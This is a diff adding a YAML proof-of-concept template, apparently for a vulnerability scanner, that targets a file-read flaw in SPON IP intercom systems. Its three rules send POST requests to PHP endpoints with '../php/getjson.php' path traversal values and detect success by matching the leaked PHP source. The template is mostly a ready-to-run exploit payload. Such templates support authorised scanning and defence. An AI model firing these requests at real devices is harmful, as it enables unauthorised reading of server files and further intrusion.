@@ -1,0 +1,42 @@
+detail:
+  author: york
+  links:
+  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247486018&idx=1&sn=d744907475a4ea9ebeb26338c735e3e9
+expression: r1() || r2() || r3()
+manual: true
+name: poc-yaml-spon-ip-intercom-file-read
+rules:
+  r1:
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
+      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
+    request:
+      body: 'jsondata[url]=../php/getjson.php
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      method: POST
+      path: /php/rj_get_token.php
+  r2:
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
+      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
+    request:
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      method: POST
+      path: /php/exportrecord.php?downname=../php/getjson.php
+  r3:
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
+      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
+    request:
+      body: 'jsondata[filename]=../php/getjson.php
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      method: POST
+      path: /php/getjson.php
+transport: http
